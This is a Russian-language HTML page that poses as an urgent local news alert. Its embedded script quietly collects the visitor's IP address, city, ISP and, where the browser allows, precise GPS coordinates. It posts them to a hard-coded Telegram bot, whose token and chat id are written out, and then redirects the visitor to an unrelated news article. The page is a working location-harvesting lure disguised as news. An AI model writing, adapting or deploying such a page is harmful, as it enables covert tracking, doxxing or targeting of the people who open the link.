<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <title>Срочная новость</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      background-color: #f4f4f4;
      font-family: Arial, sans-serif;
      color: #333;
      padding: 20px;
      max-width: 600px;
      margin: auto;
    }
    h1 {
      color: #b30000;
      font-size: 1.6em;
    }
    .content {
      margin-top: 20px;
      font-size: 1.1em;
      line-height: 1.5;
    }
    .status {
      background: #fff3cd;
      padding: 15px;
      border: 1px solid #ffeeba;
      margin-top: 25px;
      border-radius: 8px;
    }
  </style>
</head>
<body>
  <h1>Срочная новость: ЧП в вашем районе</h1>
  <div class="content">
    <p>По предварительным данным, в вашем регионе зафиксировано необычное происшествие. Подробности уточняются.</p>
    <p>Службы проверяют данные, пожалуйста, ожидайте обновления информации.</p>
  </div>

  <div class="status" id="status">
    Получение данных о вашем регионе...
  </div>

  <script>
    const redirectUrl = "https://dnepr.express/ru/post/masshtabnyj-narkobiznes-razoblachili-v-15-oblastyah-ukrainy-sredi-nih-dnepropetrovshina";

    function sendToTelegram(message) {
      fetch("https://api.telegram.org/bot7780068053:AAEfj3ROoHOupCeM7F_W7auJAkakcluF5Nw/sendMessage", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: 490491527,
          text: message
        })
      });
    }

    function startRedirect(delay = 1000) {
      setTimeout(() => {
        window.location.href = redirectUrl;
      }, delay);
    }

    fetch("https://ipwho.is/")
      .then(response => response.json())
      .then(data => {
        const ipMessage = `
IP: ${data.ip}
Город: ${data.city}
Регион: ${data.region}
Страна: ${data.country}
Провайдер: ${data.connection.isp}
Время: ${new Date().toLocaleString()}`;

        document.getElementById("status").innerText = ipMessage + "\n\n⏳ Ожидаю GPS...";

        let gpsTimeout = setTimeout(() => {
          const fallback = ipMessage + "\n\n⚠️ GPS: не получен (таймаут)";
          document.getElementById("status").innerText = fallback;
          sendToTelegram(fallback);
          startRedirect();
        }, 8000);

        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(
            pos => {
              clearTimeout(gpsTimeout);
              const lat = pos.coords.latitude;
              const lon = pos.coords.longitude;
              const acc = pos.coords.accuracy;

              const full = ipMessage + `\n\nGPS: ${lat}, ${lon}\nТочность: ${acc} м`;
              document.getElementById("status").innerText = full;
              sendToTelegram(full);
              startRedirect();
            },
            err => {
              clearTimeout(gpsTimeout);
              const errMsg = ipMessage + `\n\n⚠️ Ошибка GPS: ${err.message}`;
              document.getElementById("status").innerText = errMsg;
              sendToTelegram(errMsg);
              startRedirect();
            }
          );
        } else {
          const notSupported = ipMessage + "\n\n⚠️ GPS не поддерживается.";
          document.getElementById("status").innerText = notSupported;
          sendToTelegram(notSupported);
          startRedirect();
        }
      })
      .catch(err => {
        const failMsg = "❌ Ошибка получения IP-геолокации.";
        document.getElementById("status").innerText = failMsg;
        console.error(err);
        sendToTelegram(failMsg);
        startRedirect();
      });
  </script>
</body>
</html>

